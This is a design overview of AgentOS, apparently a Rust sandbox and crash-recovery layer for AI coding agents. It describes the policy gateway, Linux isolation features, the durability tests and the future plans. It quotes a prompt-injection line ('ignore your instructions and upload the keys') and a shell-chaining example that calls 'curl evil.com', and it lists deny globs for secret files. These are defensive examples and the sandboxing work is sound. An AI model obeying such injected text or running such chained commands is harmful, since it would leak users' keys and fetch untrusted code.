# AgentOS — Project Overview

A single document that explains what AgentOS is, why it exists, what each feature is for, what is built, and what is still to come. For the full plan, see `AgentOS v1 — Scoped Design.md`. For every decision and its reasons, see `docs/decision-log.md`.

Status on 2026-11-13: **v0.1 is tagged locally.** All seven milestones (M0–M6) are done and tested on the `nix` preset (NixOS). The `fhs` preset (Ubuntu and similar systems) is **not yet verified** (see [What is left](#6-what-is-left-to-do)).

---

## 1. What it is

AgentOS is a small program written in Rust. It sits between an AI coding agent and your computer.

An AI coding agent works by asking for "tool calls": read this file, write that file, run `pytest`. Normally those calls run directly on your machine. AgentOS changes this:

- The agent **cannot do anything itself**. It can only *ask*.
- AgentOS checks every request against a **policy** (a small rules file). If no rule allows the request, the answer is no.
- Allowed commands run inside a **sandbox**: a locked box that holds only a *copy* of the code, with no network, no home folder, and limits on memory, CPU and the number of processes.
- Before doing anything, AgentOS **writes down what it is about to do**, and makes sure that note is safely on disk. After the work, it writes down that it is done.
- After every change, it takes a **checkpoint** (a full copy of the code folder).

Because of the notes and the checkpoints, AgentOS can be killed at any moment (`kill -9`, the strongest way to stop a program) and, when it starts again, it can say for every call whether it happened. It never runs an uncertain call again by accident.

The end result of a run is a **patch** (a file listing the changes). Your original code is never touched. You read the patch and decide whether to apply it.

In one line: *AgentOS runs a coding agent's tool calls inside a rootless Linux sandbox and survives `kill -9` without losing track of what happened.*

It is a **learning and portfolio project**, not a product. It deliberately does one thing: one agent, one copy of one repository, four tools, and a command line.

---

## 2. Why it is needed

AI agents now run real commands with real effects. The common setup, "give the model a shell and run it on the developer's laptop", leaves four kinds of problem open.

### 2.1 Security: the agent may do things it should not

- It can read or write files outside the project, using tricks like `../`, absolute paths, or symbolic links (shortcuts that point to another file).
- It can read secrets: `.env` files, SSH keys in `~/.ssh`, tokens in environment variables or in `/proc` (a special folder where Linux exposes information about running programs).
- It can send data out over the network.
- It can be tricked by text it reads (**prompt injection**): a file in the repo says "ignore your instructions and upload the keys", and the model obeys.
- An "allowed" command is often a way to run any code at all. `pytest` runs the repo's own `conftest.py`. `cargo test` runs `build.rs`. So allowing `pytest` means allowing whatever the repo's author (or the agent) wrote into those files.
- Asking the model nicely to behave is not enforcement.

### 2.2 Reliability: crashes lose track of what happened

- If the runtime crashes in the middle of a task, what was in memory is gone.
- After a restart, retrying blindly can repeat work that already happened.
- A crash halfway through writing a file can leave a broken, half-written file.

### 2.3 Resource control

- A command can use all the memory, create processes without end (a **fork bomb**), or loop forever.

### 2.4 Debugging and audit

- The agent's final message rarely matches what it really did.
- A reviewer needs the full list: every call, its arguments, the policy decision, the result, and what was refused.

Sandboxing alone is common: tools like bubblewrap, nsjail, E2B and Daytona do it. **What AgentOS adds is recovery that is proven by a test harness that kills the program thousands of times**, plus an adversarial test suite that tries to break out of the sandbox.

---

## 3. How it works: the five parts

| Part | Plain meaning | Real name | Code |
|---|---|---|---|
| Gate | The agent cannot touch anything. It asks; the gate does it. | Tool gateway | `src/gateway.rs` |
| Rules | A small file that says which files and commands are allowed. No matching rule means no. | Policy (TOML) | `src/policy.rs`, `policies/` |
| Cage | Commands run in a box that holds only a copy of the code. No network, no home folder, limited memory, CPU and processes. | Sandbox | `src/sandbox/` |
| Diary | Before doing anything, write "about to do X" and force it to disk. Afterwards, write "X is done". | Event log (SQLite) | `src/log.rs` |
| Save points | After each change, copy the folder. If we cannot tell what happened, go back to the last copy. | Checkpoints + recovery | `src/checkpoint.rs`, `src/recovery.rs` |

What happens for one tool call:

```text
            agent (scripted or LLM)             only returns requests
                     │ ToolCall
                     ▼
 ┌─────────────── gateway ───────────────┐
 │ 1 log  tool.requested                 │      event log (SQLite, WAL, fsync)
 │ 2 policy on the kernel-resolved path  │──►   executions/<id>/log.db
 │ 3 log  tool.intent        (fsync)     │
 │ 4 effect ─ fs tools: openat2 handles  │      checkpoints/cp-000N   blobs/
 │           ─ exec ──────────────────────────► sandbox: user+mount+pid+net namespaces,
 │ 5 checkpoint (cp -a --reflink)        │      new root with /work only, cgroup limits,
 │ 6 log  tool.completed [cp-000N]       │      no capabilities, Landlock
 └───────────────────────────────────────┘
        the sandbox sees work/ and nothing else of the execution folder
```

The four tools the agent can ask for:

| Tool | What it does | Changes anything? |
|---|---|---|
| `fs.read` | Read one file from the workspace | No |
| `fs.list` | List a folder in the workspace | No |
| `fs.write` | Write one file in the workspace | Yes |
| `exec` | Run an allowed command (for example `pytest`) in the sandbox | Yes, anything inside `/work` |

---

## 4. Features, and why each one is needed

Each feature below exists to stop a specific attack or a specific failure. The "Stops" column says which. Every feature has tests (see `tests/` and `docs/threat-model.md`).

### 4.1 Control: the gateway and the policy

| Feature | What it is | Why it is needed (what it stops) |
|---|---|---|
| **Gateway** | One place in the code through which every tool call must pass. | If the agent could act directly, no check would be possible. One gate means one place to check, log and limit. (Design rule 1.) |
| **Default-deny policy** | A TOML file listing allowed read paths, write paths, denied paths, allowed commands and limits. No matching rule means "no". | A list of things to forbid is never complete; a list of things to allow is. (Design rule 2.) |
| **Deny globs** (for example `.env`, `secrets/**`, `**/*.pem`, `.git/**`) | Files matching these patterns are refused. | Stops the agent reading secrets that live inside the repo. |
| **Command allowlist as argv prefixes, run with `execve`, never a shell** | A command is a list like `["pytest", "-q"]`, not a text string. | A shell string can be bent: `pytest; curl evil.com` becomes two commands. With a list, there is no shell to trick. (Design rule 8.) |
| **Call limit** (`max_tool_calls`) and **output limit** (`max_output_kb`) | A run stops after N calls; command output is cut at a size. | Stops endless agent loops and huge outputs that would fill memory or the log. |

### 4.2 The workspace and its output

| Feature | What it is | Why it is needed |
|---|---|---|
| **Workspace is a copy of the repo** | The repo is copied into a scratch folder; the agent works on the copy. | The original repo is never modified. (Design rule 10.) |
| **Denied files are never copied** | Files that match a deny glob are left out of the copy. | This is what makes deny rules real for code run by `exec`. An allowed `pytest` runs the repo's own code, which could try to open `.env`. If the file does not exist in the box, nothing can read it. (Design rule 6, ADR 0008.) |
| **Symlinks copied as symlinks, never followed** | A shortcut file stays a shortcut; its target is not copied in. | Stops a planted link from pulling a host file (like `~/.ssh/id_rsa`) into the workspace. |
| **Patch output** | The result is a `diff` between the first checkpoint and the final workspace. | A human reads the patch before anything reaches the real repo. |

### 4.3 The sandbox (the cage)

Each `exec` runs in a fresh child process with its own set of Linux isolation features. The file tools run in the runtime itself but use a kernel feature to stay inside the workspace.

| Feature | Plain meaning | Real term | Why it is needed (what it stops) |
|---|---|---|---|
| **Own view of the filesystem** | The command sees a new, almost empty root: the workspace at `/work`, read-only system folders, an empty `/tmp`. No `/home`. | Mount namespace, `pivot_root`, bind mounts | Reading host files and secrets such as `~/.ssh`. |
| **Kernel-enforced paths for the file tools** | The kernel itself refuses any path that leaves the workspace, even through a symlink. The handle that was checked is the one that is used. | `openat2` with `RESOLVE_BENEATH` and `RESOLVE_NO_MAGICLINKS` | `../`, absolute paths, symlinks pointing out, and the **TOCTOU** attack (time of check to time of use: a symlink is swapped between the check and the use). String checks cannot stop this race; the kernel can. (Design rule 7.) |
| **Second wall on paths** | A kernel rule set that allows read-write on `/work` and read-only on system folders, and nothing else. | Landlock | Defence in depth: if a mistake in the mount setup ever exposed something, this still blocks it. |
| **Own process world, no privileges** | The command cannot see or signal host processes; it has no special powers, and setuid programs cannot raise its powers. | User + PID namespaces, `PR_SET_NO_NEW_PRIVS`, all capabilities dropped | Killing or spying on host programs, privilege tricks. |
| **No network** | The box has only a loopback interface. | Empty network namespace | Sending data out (exfiltration) and downloading tools. |
| **Resource limits** | Caps on memory, number of processes and CPU; a watchdog kills the whole group when the time limit is reached. | cgroup v2: `memory.max`, `pids.max`, `cpu.max`; wall-clock watchdog thread | Fork bombs, using all memory, infinite loops. |
| **Clean environment** | Only `PATH`, `HOME=/work` and `LANG` are passed in. | Environment scrubbing | Leaking tokens and passwords held in environment variables. |
| **Rootless** | Nothing needs `sudo`. systemd hands a cgroup subtree to the user. | `systemd-run --user --scope -p Delegate=yes` (ADR 0006) | Running a security tool as root would be a risk of its own, and it makes the project easy to try. |
| **Write globs enforced after each `exec`** | After a command, the workspace is compared with the checkpoint. Any change outside the allowed write paths is put back and logged as a policy violation. | Post-exec diff and revert (ADR 0009) | Code run by `pytest` can write anywhere in `/work`; this keeps it to the allowed paths. |
| **Log and checkpoints hidden from the box** | The sandbox sees `work/` and nothing else of the execution folder. | Mount layout | The agent rewriting its own history. (Design rule 9.) |
| **Distro presets** | Where programs live differs between Linux systems, so the read-only system folders are set in the policy: `fhs` (`/usr`, `/bin`, `/lib`, `/lib64`) or `nix` (`/nix/store`). | Policy presets (ADR 0011) | Keeps `src/` free of distro-specific code; the same binary works on Ubuntu and NixOS. |
| **Startup checks** | On start, AgentOS checks for user namespaces, Landlock, `openat2` and cgroup delegation, and stops with a clear message if one is missing. | Feature probes | A missing feature found halfway through a run would leave a mess; found at start, it changes nothing. |

### 4.4 Durability: surviving `kill -9`

| Feature | What it is | Why it is needed |
|---|---|---|
| **Intent before effect** | Before any effect, an "intent" record is written to the log and forced to disk (`fsync`). | After a crash, a call with an intent but no "done" record is known to be *uncertain*. Without the intent, AgentOS would not even know the call had started. (Design rule 3.) |
| **Append-only event log in SQLite** | Every request, policy decision, intent, result and LLM message is a row. WAL mode, `synchronous=FULL`. | It is the diary that recovery reads, and the record that `agentos trace` prints for audit. |
| **Tool-call state machine** | Each call moves through fixed states: requested → allowed/denied → intent → completed/failed, or UNCERTAIN after a crash. | Makes "what happened to call #6" a question with a definite answer. |
| **Atomic file writes** | `fs.write` writes a temporary file, forces it to disk, then renames it over the target. | A crash never leaves a half-written file. |
| **Checkpoint after every change** | A full copy of the workspace (fast copy-on-write `reflink` on btrfs/XFS), written under a temporary name and then renamed. | Gives recovery a known-good state to return to. Directory copies were chosen over git because a test showed git misses ignored files, empty folders, file modes and a nested `.git` (ADR 0007). |
| **Strict order: effect → checkpoint → COMPLETED (naming the checkpoint)** | A call is never marked done without its checkpoint. | Recovery can trust that "the last checkpoint named in the log" is real and complete. (Design rule 4.) |
| **Hashes in the log, contents in blobs** | The `fs.write` intent stores the hash of the file before and after. | Lets recovery decide whether an interrupted write happened by looking at the file (ADR 0004). |
| **Per-tool recovery rules** | `fs.read`/`fs.list`: not applied, may be asked again. `fs.write`: file matches new hash → APPLIED; old hash → NOT APPLIED; anything else → roll back. `exec`: cannot be known → roll back to the last checkpoint. | An uncertain call is never re-run before it is settled. (Design rule 5, ADR 0003.) |
| **Re-entrant recovery** | Recovery itself can be killed and run again. | A crash during recovery must not make things worse. |
| **Resume** | `agentos run --resume <id>` recovers, rebuilds the agent's conversation from the log, gives it a result for each settled call, and continues. | The agent picks up where it stopped, and nothing runs twice (ADR 0005). |
| **Child processes die with the runtime** | Every helper process (the sandbox helper, the `cp` that makes a checkpoint) is set to be killed by the kernel when the runtime dies. | Without it, a copy kept running after the runtime was killed and wrote a folder *after* recovery had cleaned up (bug B-007). |

### 4.5 Agents and the command line

| Feature | What it is | Why it is needed |
|---|---|---|
| **Scripted agent** | Reads a fixed list of tool calls from a TOML file. | Tests need the same calls every time; a real model is not repeatable. |
| **LLM agent** | A minimal loop that talks to any OpenAI-compatible endpoint (a local `llama-server`, or a hosted API with a key). The model is called by the runtime, outside the sandbox; the key is never written to disk. | Shows the system works with a real model, not only with a script. |
| **CLI** | `run`, `status`, `trace`, `recover`, `run --resume`. | `trace` prints one line per call (or every record, or JSON), which is the audit view. |
| **Fault-injection hooks** | `AGENTOS_CRASH_AT=P4 AGENTOS_CRASH_CALL=6` makes the runtime kill itself at an exact point. | Lets the test harness (and a person) prove recovery at every crash point. |

---

## 5. What has been implemented

### 5.1 Milestones

All of these are done and tagged locally (`m0` … `m6`, `v0.1`). Each has a document in `docs/milestones/`.

| Milestone | What was built | Exit criterion | Result |
|---|---|---|---|
| **M0** Rust ramp | A practice CLI: TOML file in, SQLite rows out | Works | Done |
| **M1** Vertical slice | Gateway, the four tools, policy, scripted agent, event log, `agentos trace` (no sandbox yet) | Scripted agent fixes the demo repo's failing test; `trace` prints every call | Done |
| **M2** Sandbox | Namespaces, new root, cgroup v2, Landlock, `openat2`, environment scrubbing, both presets | 20 adversarial cases, 0 escapes | Done |
| **M3** Durability | State machine, intent fsync, directory checkpoints, `recover`, `--resume`, fault-injection harness | P1–P8 pass all invariants over 200 runs each | Done (`nix`) |
| **M4** LLM agent | Agent loop against an OpenAI-compatible endpoint | A real LLM completes the demo task in the sandbox | Done (local 4B model; three failed attempts are also recorded) |
| **M5** Benchmarks | 32 adversarial cases including the TOCTOU race, 23 benign operations, three benchmarks, CI file | Three numbers with p50/p95/p99 and hardware details | Done (`nix`) |
| **M6** Release | README, threat model, recovery semantics, 11 ADRs, demo script, license | A stranger can run the demo in under 10 minutes | Done on NixOS (23 s); Ubuntu not run |

Small experiments that tried each mechanism alone before it was built (`unshare`, `pids.max`, `openat2`, Landlock, atomic rename and SQLite under `kill -9`) are in `experiments/`.

### 5.2 Results of record (`nix` preset)

All numbers come from scripts; raw data is in `docs/results/`.

| Suite | What it does | Result |
|---|---|---|
| **Fault injection** | Kills the runtime at 8 points (P1 before the intent … P8 during recovery) for each tool, 200 times each, then recovers, checks 5 invariants, and resumes. | 4,800 runs, **0 invariant violations**, 0 duplicated effects, 3,918 of 3,918 cut-off calls classified correctly. `recover`: p50 20 ms, p99 55 ms |
| **Adversarial security** | 32 attacks: path traversal, symlinks, a symlink flipped about 6,000 times during 300 file calls, `conftest.py` reading denied and host files, writes outside the allowed paths, network, fork bomb, memory hog, infinite loop, privilege tricks, the event log, the output patch | 32 passed, **0 escapes** |
| **Benign** | 23 ordinary operations under the shipped policy | **0 false denials** |
| **Overhead** (release build, i5-13420H, btrfs) | Each compared with running directly | Sandboxed `true`: p50 7.8 ms, p99 24.6 ms (direct 1.3 / 2.8 ms). `fs.write` 4 KB with log and checkpoint: p50 13.7 ms, p99 23.8 ms (direct durable write 1.9 / 2.8 ms). Demo task: p50 507 ms vs 376 ms direct (+35%) |

### 5.3 Bugs the tests found

Seven bugs in the runtime itself were found by the suites or the demo, each with a note in `docs/bugs.md`: a cgroup setup race (B-001), a crash on one-sided symlinks in the patch (B-002), a weak delegation check (B-003), `openat2` rejecting a flag combination (B-004), `fs.read` hanging on a named pipe (B-005), the wrong "latest" execution (B-006), and a checkpoint copy that outlived the killed runtime (B-007, found only on the first Ubuntu CI run).

---

## 6. What is left to do

### 6.1 To close v0.1 (only Prince can do these)

| Item | State | What is needed |
|---|---|---|
| **`fhs` preset (Ubuntu) verified** | The first CI run on Ubuntu 24.04 passed lint, unit tests, the security and benign suites, but the 200-kill suite had **1 violation in 4,800 runs** (cell P5 `exec`, bug B-007). The fix (D-070: the `cp` child gets `PR_SET_PDEATHSIG`) and its reproducing test are in the working tree, **not yet committed** at the time of writing. | Commit the fix, push, and get a green CI run. Only then change the documents that say "not yet verified". |
| **Demo on Ubuntu in under 10 minutes** | Not run. | Follows from the item above. |
| **Push** | `main` is on GitHub; the tags are not. | Prince pushes (Claude never pushes). |
| **Project name** | Open (D-023, D-068). | Prince decides. |

Until the `fhs` box is closed, the v1 definition of done is not fully met, by its own rule.

### 6.2 Bonus (allowed now that v0.1 is tagged, but only if Prince asks)

One fake external tool: a small local service with injectable timeouts, called through the gateway with an **idempotency key** (a unique id that lets the service recognise a repeated request). It gives the hardest recovery case, "an uncertain call that cannot be rolled back", something real to do. It is not part of the definition of done.

### 6.3 Later phases ("maybe someday", from `AgentOS_Project_Spec.md`)

These are **not committed work**. The spec is a list of ideas; the v1 document wins if they disagree. They are listed so the direction is clear.

| Phase | Theme | Candidate features | Why it would matter |
|---|---|---|---|
| 2 | Hardening and real-world effects | seccomp filter; hash-chained log; disk-full and fsync-failure injection; network allowlist proxy and a package mirror; credential brokering and secret redaction; git tools and a first external tool (open a PR) with reconciliation; approval workflow; agent as a separate process; token and cost budgets | Real agents need some network, some secrets and some external effects; each needs its own containment and recovery story. |
| 3 | TraceWeaver (observability) | Versioned event schema; timeline and inspector (CLI/TUI, later web); causal graph; file-change and security views; replay; run diff; OpenTelemetry export | Answer "why did the agent do that?" and compare runs. |
| 4 | Integrations | Local daemon and API; Python SDK; AgentOS as an MCP server and MCP client adapter; policy packs; examples with popular agent frameworks | Let other agents use AgentOS as their execution backend. |
| 5 | Scale | Concurrent executions, scheduler, multi-agent, remote workers, shared storage, organisation-level policy | Many agents, many machines. |
| 6 | Research | Other sandbox backends (gVisor, microVMs); migration; information-flow control; policy synthesis from traces | Open questions, each a project of its own. |

Parking-lot ideas (§22 of the spec) include an `fs.patch` tool so small models need not resend whole files (raised in M4, D-060), signed execution records, anomaly flags, eBPF observation, WASM tools, and cost attribution.

---

## 7. What it does not do (honest limits)

- **Not hardened like a production container runtime.** No seccomp filter; kernel bugs are out of scope; tested on one kernel and one distribution.
- **No power-loss guarantee.** The tests kill the process; they do not cut power. Checkpoints are not fsynced.
- **No exactly-once execution.** A command that was cut off is rolled back and may be asked for again by the agent as a new call.
- **No disk limit.** A command can fill the disk; checkpoints are never pruned. (A tmpfs would give a hard cap but is lost when the runtime is killed, which breaks recovery; ADR 0010.)
- **No network for commands, ever.** No web search, no package downloads.
- **The sandbox can see** the read-only system folders in full (on NixOS, all of `/nix/store`) and some host facts (host name, kernel version, the workspace path).
- **Prompt injection is contained, not prevented.** A file can talk the model into asking for something bad; the policy and sandbox refuse or confine it.
- **Containment ends at the patch.** A patch can change test hooks or CI files that later run *unsandboxed* on your machine. Read it before applying it.

---

## 8. How to try it

```sh
nix develop -c make demo      # the fix, then a deliberate kill, recover and resume
nix develop -c make test      # all tests, quick (about 30 s)
nix develop -c make eval      # the three suites at full size (about 13 min)
```

By hand:

```sh
alias agentos='systemd-run --user --scope -p Delegate=yes -q target/debug/agentos'
agentos run --repo examples/demo-repo --policy policies/nix.toml --agent scripted --script examples/scripts/fix-demo.toml
agentos trace
```

---

## 9. Where to read more

| Document | What it holds |
|---|---|
| `AgentOS v1 — Scoped Design.md` | The plan: scope, cut list, threat model, milestones, definition of done |
| `AgentOS_Project_Spec.md` | The long-term "maybe someday" vision |
| `README.md` | Quick start and results |
| `docs/decision-log.md` | Every decision taken or rejected, with reasons and evidence; findings; glossary |
| `docs/milestones/` | One document per milestone, with the code explained piece by piece |
| `docs/decisions/` | 11 ADRs for the hard-to-undo decisions |
| `docs/threat-model.md` | Each attack, its defence and its test |
| `docs/recovery-semantics.md` | What a crash leaves and what recovery decides, per crash point and tool |
| `docs/bugs.md` | Bugs found by the test suites |
| `docs/results/` | Results of record with raw data |
